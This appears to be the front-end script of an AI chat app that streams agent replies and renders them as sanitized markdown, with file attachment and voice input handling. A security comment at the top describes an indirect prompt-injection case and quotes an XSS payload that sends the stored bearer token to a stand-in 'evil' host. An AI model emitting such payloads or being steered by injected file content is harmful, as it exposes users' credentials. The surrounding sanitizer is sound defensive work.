 <script>
 // SECURITY (F-06): AI/agent output is rendered into innerHTML via
 // marked.parse(). marked does NOT strip raw HTML, so an indirect prompt
 // injection (e.g. from uploaded file content) could make the model emit
 // <img src=x onerror="fetch('//evil/'+localStorage.basira_token)"> and
 // exfiltrate the stored bearer token from inside the WebView. This
 // self-contained sanitizer (no CDN dependency) removes dangerous elements,
 // all on* event-handler attributes, and javascript: URLs from the parsed
 // HTML before it is inserted. Render AI markdown via renderSafeMarkdown().
 (function () {
   var BANNED_TAGS = ['SCRIPT','IFRAME','OBJECT','EMBED','LINK','META','BASE','FORM','STYLE','SVG','MATH'];
   function sanitizeNode(root) {
     var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, null);
     var toRemove = [];
     var node = walker.nextNode();
     while (node) {
       if (BANNED_TAGS.indexOf(node.tagName) !== -1) {
         toRemove.push(node);
       } else {
         for (var i = node.attributes.length - 1; i >= 0; i--) {
           var attr = node.attributes[i];
           var name = attr.name.toLowerCase();
           var val = (attr.value || '').replace(/\s+/g, '').toLowerCase();
           if (name.indexOf('on') === 0) {
             node.removeAttribute(attr.name);
           } else if ((name === 'href' || name === 'src' || name === 'xlink:href') &&
                      (val.indexOf('javascript:') === 0 || val.indexOf('data:text/html') === 0)) {
             node.removeAttribute(attr.name);
           }
         }
       }
       node = walker.nextNode();
     }
     toRemove.forEach(function (n) { if (n.parentNode) n.parentNode.removeChild(n); });
   }
   window.renderSafeMarkdown = function (text) {
     var html;
     try { html = marked.parse(text || ''); }
     catch (e) { return document.createTextNode(text || '').textContent; }
     var tpl = document.createElement('div');
     tpl.innerHTML = html;
     sanitizeNode(tpl);
     return tpl.innerHTML;
   };
 })();
</script>

  function autoResizeChatInput(el) {
   el.style.height = 'auto';
   el.style.height = Math.min(el.scrollHeight, 125) + 'px';
  }

  function scrollToBottom() {
   if (chatBody) {
    chatBody.scrollTop = chatBody.scrollHeight;
   }
  }

  function addUserMessage(text, skipSave) {
   var row = document.createElement('div');
   row.className = 'msg-row user';
   var isArabic = /[\u0600-\u06FF]/.test(text);
   row.innerHTML = '<div class="msg-bubble' + (isArabic ? ' rtl' : '') + '"></div>';
   row.querySelector('.msg-bubble').textContent = text;
   chatBody.appendChild(row);
   scrollToBottom();
   if (!skipSave) {
     chatHistory.push({ role: 'user', content: text });
     localStorage.setItem('baseera_mobile_chat_history', JSON.stringify(chatHistory));
   }
  }

  function addBotMessage(text) {
   var row = document.createElement('div');
   row.className = 'msg-row bot';
   row.innerHTML = '<img class="msg-avatar" src="images/logo-cropped.png" alt=""><div class="msg-bubble"></div>';
   var displayReply = text.replace(/(?:\s*)?(AGENT_LOG:|STATUS___:|STATUS:)(.*?)(?=$|\n|\s*AGENT_LOG:|STATUS___:|STATUS:|<agent_state>)/g, '').trim();
   displayReply = displayReply.replace(/<agent_state>([\s\S]*?)<\/agent_state>/g, '<div style="font-size:11px; color:#64748b; background:rgba(0,0,0,0.04); padding:6px 10px; border-radius:6px; margin-bottom:6px; display:flex; align-items:center; gap:6px; font-weight:600;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg> $1</div>').trim();
   displayReply = displayReply.replace(/\[\[COMMITTEE_DONE\]\]/g, '').trim();
   displayReply = displayReply.replace(/\[\[AGENT_END:.*?\]\]/g, '').trim();
   try {
     row.querySelector('.msg-bubble').innerHTML = renderSafeMarkdown(displayReply);
   } catch(e) {
     row.querySelector('.msg-bubble').textContent = displayReply;
   }
   chatBody.appendChild(row);
   scrollToBottom();
  }

  function addTypingIndicator() {
   var row = document.createElement('div');
   row.className = 'msg-row bot';
   row.id = 'typing-row';
   row.innerHTML = '<img class="msg-avatar" src="images/logo-cropped.png" alt=""><div class="typing-bubble"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>';
   chatBody.appendChild(row);
   scrollToBottom();
  }

  function replaceTypingWithReply(text) {
   var typingRow = document.getElementById('typing-row');
   if (typingRow) {
    typingRow.innerHTML = '<img class="msg-avatar" src="images/logo-cropped.png" alt=""><div class="msg-bubble"></div>';
    try {
     typingRow.querySelector('.msg-bubble').innerHTML = renderSafeMarkdown(text);
    } catch(e) {
     typingRow.querySelector('.msg-bubble').textContent = text;
    }
    typingRow.removeAttribute('id');
   }
   scrollToBottom();
  }

  async function handleSend() {
   var text = chatInput.value.trim();
   if (!text) return;
   
   addUserMessage(text, false);
   chatInput.value = ''; chatInput.style.height = '38px'; removeAttachment();
   
   addTypingIndicator();

   var currentLang = getAppLanguage();

   try {
    var response = await fetch('http://127.0.0.1:8000/api/insights/chat', {
     method: 'POST',
     headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + (localStorage.getItem('basira_token') || '')
     },
     body: JSON.stringify({
      messages: chatHistory,
      fileContext: attachedFileContent || (attachedFile ? '[Attached: ' + attachedFile.name + ']' : ''),
      agent_id: activeMobileAgent,
      lang: currentLang
     })
    });
    
    if (!response.ok) throw new Error('API returned ' + response.status);
    
    var reader = response.body.getReader();
    var decoder = new TextDecoder("utf-8");
    var fullText = '';
    var typingRow = document.getElementById('typing-row');
    var buffer = '';
    
    while (true) {
     var res = await reader.read();
     if (res.done) break;
     buffer += decoder.decode(res.value, {stream: true});
     var lines = buffer.split('\n');
     buffer = lines.pop();
     for (var i = 0; i < lines.length; i++) {
      var line = lines[i].trim();
      if (line.startsWith('data: ')) {
       try {
        var data = JSON.parse(line.substring(6));
        var part = (data.candidates && data.candidates[0] && data.candidates[0].content && data.candidates[0].content.parts && data.candidates[0].content.parts[0].text) || '';
        
        // Skip internal server tokens
        if (part.indexOf('STATUS___:') !== -1 || part.indexOf('AGENT_LOG:') !== -1) {
         continue;
        }
        
        fullText += part;
        
        // Live streaming display update
        if (typingRow && fullText) {
         var bubble = typingRow.querySelector('.msg-bubble');
         if (!bubble) {
          typingRow.innerHTML = '<img class="msg-avatar" src="images/logo-cropped.png" alt=""><div class="msg-bubble"></div>';
          bubble = typingRow.querySelector('.msg-bubble');
         }
         if (bubble) {
          var displayReply = fullText.replace(/(?:\s*)?(AGENT_LOG:|STATUS___:|STATUS:)(.*?)(?=$|\n|\s*AGENT_LOG:|STATUS___:|STATUS:|<agent_state>)/g, '').trim();
          displayReply = displayReply.replace(/<agent_state>([\s\S]*?)<\/agent_state>/g, '<div style="font-size:11px; color:#64748b; background:rgba(0,0,0,0.04); padding:6px 10px; border-radius:6px; margin-bottom:6px; display:flex; align-items:center; gap:6px; font-weight:600;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg> $1</div>').trim();
          displayReply = displayReply.replace(/\[\[COMMITTEE_DONE\]\]/g, '').trim();
          displayReply = displayReply.replace(/\[\[AGENT_END:.*?\]\]/g, '').trim();
          try {
           bubble.innerHTML = renderSafeMarkdown(displayReply);
          } catch(e) {
           bubble.textContent = displayReply;
          }
          scrollToBottom();
         }
        }
       } catch(err) {}
      }
     }
    }
    
    if (fullText) {
     if (typingRow) typingRow.removeAttribute('id');
     chatHistory.push({ role: 'assistant', content: fullText });
     localStorage.setItem('baseera_mobile_chat_history', JSON.stringify(chatHistory));
    } else {
     throw new Error('Empty response');
    }
   } catch (err) {
    console.error('Chat error:', err);
    replaceTypingWithReply('عذراً، حدث خطأ أثناء الاتصال بالخادم. يرجى التأكد من تشغيل الخادم.');
   }
  }

  if (chatSend) {
   chatSend.addEventListener('click', handleSend);
  }
  if (chatInput) {
   chatInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && !e.shiftKey) {
     e.preventDefault();
     handleSend();
    }
   });
  }


  // ---------- Attachment Handling ----------
  let attachedFile = null;
  let attachedFileContent = '';

  function handleFileSelected(e) {
   const file = e.target.files && e.target.files[0];
   if (!file) return;

   attachedFile = file;
   const previewBar = document.getElementById('attachmentPreviewBar');
   const nameEl = document.getElementById('attachmentFileName');
   const sizeEl = document.getElementById('attachmentFileSize');

   if (nameEl) nameEl.textContent = file.name;
   if (sizeEl) {
    const kb = (file.size / 1024).toFixed(1);
    sizeEl.textContent = '(' + kb + ' KB)';
   }
   if (previewBar) previewBar.style.display = 'flex';

   // Read file content
   const reader = new FileReader();
   if (file.type.startsWith('image/')) {
    reader.onload = function(evt) {
     attachedFileContent = '[Image Attached: ' + file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)]';
    };
    reader.readAsDataURL(file);
   } else {
    reader.onload = function(evt) {
     const text = evt.target.result;
     attachedFileContent = text ? text.substring(0, 5000) : '';
    };
    reader.readAsText(file);
   }
   chatInput.focus();
  }

  function removeAttachment() {
   attachedFile = null;
   attachedFileContent = '';
   const previewBar = document.getElementById('attachmentPreviewBar');
   const fileInput = document.getElementById('chat-file-input');
   if (previewBar) previewBar.style.display = 'none';
   if (fileInput) fileInput.value = '';
  }

  // ---------- Voice Recognition (Microphone) ----------
  let isRecording = false;
  let recognitionInstance = null;

  function toggleVoiceRecording(e) {
   if (e) {
    e.preventDefault();
    e.stopPropagation();
   }

   const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
   if (!SpeechRecognition) {
    if (typeof showToast === 'function') {
     showToast('المتصفح الحالي لا يدعم التعرف الصوتي المباشر');
    } else {
     alert('المتصفح الحالي لا يدعم ميزة التسجيل الصوتي. يرجى استخدام متصفح Chrome أو Edge.');
    }
    return;
   }

   const micBtn = document.getElementById('chat-mic-btn');

   if (isRecording && recognitionInstance) {
    recognitionInstance.stop();
    return;
   }

   try {
    recognitionInstance = new SpeechRecognition();
    const currentLang = document.documentElement.getAttribute('lang') || 'ar';
    recognitionInstance.lang = currentLang === 'ar' ? 'ar-SA' : 'en-US';
    recognitionInstance.continuous = false;
    recognitionInstance.interimResults = true;

    recognitionInstance.onstart = function() {
     isRecording = true;
     if (micBtn) {
      micBtn.style.color = '#ef4444';
      micBtn.style.background = 'rgba(239, 68, 68, 0.12)';
      micBtn.style.transform = 'scale(1.15)';
     }
     const statusContainer = document.getElementById('agentStatusContainer');
     const statusText = document.getElementById('agentStatusText');
     if (statusContainer && statusText) {
      statusText.textContent = ' جارٍ الاستماع لصوتك... تحدث الآن';
      statusContainer.style.display = 'flex';
     }
    };

    recognitionInstance.onresult = function(evt) {
     let transcript = '';
     for (let i = evt.resultIndex; i < evt.results.length; ++i) {
      transcript += evt.results[i][0].transcript;
     }
     if (transcript && chatInput) {
      chatInput.value = transcript;
      autoResizeChatInput(chatInput);
     }
    };

    recognitionInstance.onerror = function(evt) {
     console.warn('Speech recognition error:', evt.error);
     stopVoiceUI();
    };

    recognitionInstance.onend = function() {
     stopVoiceUI();
    };

    recognitionInstance.start();
   } catch (err) {
    console.error('Speech start error:', err);
    stopVoiceUI();
   }
  }

  function stopVoiceUI() {
   isRecording = false;
   const micBtn = document.getElementById('chat-mic-btn');
   if (micBtn) {
    micBtn.style.color = '#6366f1';
    micBtn.style.background = 'transparent';
    micBtn.style.transform = 'scale(1)';
   }
   const statusContainer = document.getElementById('agentStatusContainer');
   if (statusContainer) {
    statusContainer.style.display = 'none';
   }
  }

 
    // Auto-select agent from URL query param
    document.addEventListener('DOMContentLoaded', () => {
      const params = new URLSearchParams(window.location.search);
      const ag = params.get('agent');
      if (ag && typeof selectAgent === 'function') {
        setTimeout(() => selectAgent(ag), 300);
      }
    });
            
</script>
